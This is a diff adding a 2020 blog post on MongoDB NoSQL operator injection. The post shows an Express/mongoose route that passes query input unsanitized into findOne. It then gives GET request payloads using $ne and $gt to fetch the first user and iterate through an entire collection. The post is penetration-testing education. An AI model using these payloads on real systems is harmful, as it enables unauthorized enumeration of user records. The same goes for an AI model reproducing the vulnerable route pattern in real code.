@@ -1,0 +1,81 @@
+# MongoDB NoSQL Operator Injection: Iterating Collections
+
+<p className="text-xs text-right">July 25, 2020 by [patrickd](/about#patrickd)</p>
+
+During Penetration-Test reconnaissance, enumerating through rows of a SQL database is usually simple due to the use of sequential identifiers:
+
+```bash
+GET /users?id=1
+GET /users?id=2
+GET /users?id=3
+...
+```
+
+The NoSQL database [MongoDB](https://www.mongodb.com/) uses ["ObjectIds"](https://docs.mongodb.com/manual/reference/method/ObjectId/) which are 12 byte (represented as a 24 characters long hexdecimal string) identifiers made up of:
+
+
+| Length        | Description     |
+| ------------: | :---------  |
+| 4 bytes       | unix timestamp |
+| 5 bytes       | "random" value, typically a 3 byte machine specific identifier (eg. from mac address) and the 2 byte process id |
+| 3 bytes       | sequential counter (does not reliably count in increments of 1) |
+
+Although this means that ObjectIds can be called "incremental" (as each new id is greater than the previous one), they are still more difficult to predict than a simple integer.
+
+## Exploit
+
+Let's assume we have a NodeJS application with a route controller executing a read operation (using the [mongoose ODM](https://mongoosejs.com/) library) in order to fetch a single document from a collection with a specified identifier:
+
+```javascript showLineNumbers filename="Route Controller" /req.query.id/
+// GET /users?id=5ef3bfd5bec2121c8525f3fe
+app.get('/users', async (req) => {
+  // -> db.users.findOne({ _id: ObjectId('5ef3bfd5bec2121c8525f3fe') })
+  return userModel.findOne({ _id: req.query.id });
+});
+```
+
+The used [expressJS](https://expressjs.com/) HTTP application server framework (and many others) will parse the query parameters while allowing arrays (`?key[]=value1&key[]=value2{:js}`) and even objects (`?key[field]=value{:js}`) to be specified.
+
+This can be used to inject query operators such as not-equal (`$ne`):
+
+```bash
+GET /users?id[$ne]=000000000000000000000000
+```
+
+Resulting query: Find one document with an ID that is *not equal* to the specified ID.
+```javascript
+db.users.findOne({ _id: { $ne: ObjectId('000000000000000000000000') } })
+```
+
+This yields us the very first document of the users collection (the first document that does not match the specified identifier in the natural order of the collection), which is typically an administrative user.
+
+After having determined the identifier of the first document in the collection, we can use the greater-than (`$gt`) operator to iterate over the whole collection:
+
+```bash
+GET /users?id[$ne]=000000000000000000000000
+  -> 1. document: _id: 5f1caba000aa76a6263c1854
+GET /users?id[$gt]=5f1caba000aa76a6263c1854
+  -> 2. document: _id: 5f1caba300aa76a6263c1857
+GET /users?id[$gt]=5f1caba300aa76a6263c1857
+  -> 3. document: _id: 5f1cabae00aa76a6263c185f
+...
+```
+
+## Caveats
+
+Note that vectors involving MongoDB ObjectIds are only available when ODMs such as mongoose are used that will automatically convert strings into them. When [native clients](https://mongodb.github.io/node-mongodb-native/) are used, query values will usually be passed through a conversion function causing errors to be thrown when attempting to exploit this flaw: `Provided identifier is not a valid MongoDB ObjectId string: '[object Object]'`.
+
+Another problem is that the ID must be part of the query parameters. If REST-like patterns are used and the identifier is part of the path (`/users/5ef3bfd5bec2121c8525f3fe`) we won't be able to inject operators so easily.
+
+---
+
+import { Card, Cards } from 'nextra/components'
+import { NewsletterIcon } from '@components/icons'
+
+<Cards>
+  <Card
+    icon={<NewsletterIcon />}
+    title="MongoDB NoSQL Operator Injection: Cracking Sessions →"
+    href="/posts/2020/8/9/cracking-sessions-mongodb-nosql-operator-injection/"
+  />
+</Cards>
